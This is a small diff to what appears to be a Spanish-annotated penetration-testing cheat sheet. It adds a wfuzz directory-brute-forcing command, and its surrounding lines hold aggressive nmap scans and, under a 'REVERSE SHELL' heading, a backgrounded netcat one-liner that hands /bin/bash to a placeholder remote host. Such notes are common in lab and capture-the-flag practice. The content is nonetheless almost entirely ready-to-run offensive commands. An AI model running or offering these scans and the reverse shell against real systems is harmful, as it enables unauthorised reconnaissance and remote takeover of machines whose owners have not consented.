@@ -11,6 +11,9 @@ nmap -p- -sS --min-rate 5000 -vvv -n --open -T5 -Pn X.X.X.X -oN nmap_full --> Ma
 nmap -sC -sV -p21,22,80,443,8080 X.X.X.X -oN nmap_detailled
 nmap --script http-enum -p80 X.X.X.X -oN ScanWeb
 
+##WEB FUZZING##
+wfuzz -c -hc=500 -t 500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://x.x.x.x
+
 ##REVERSE SHELL##
 nohup nc -e /bin/bash X.X.X.X 1234 & --> shell con proceso independiente
 
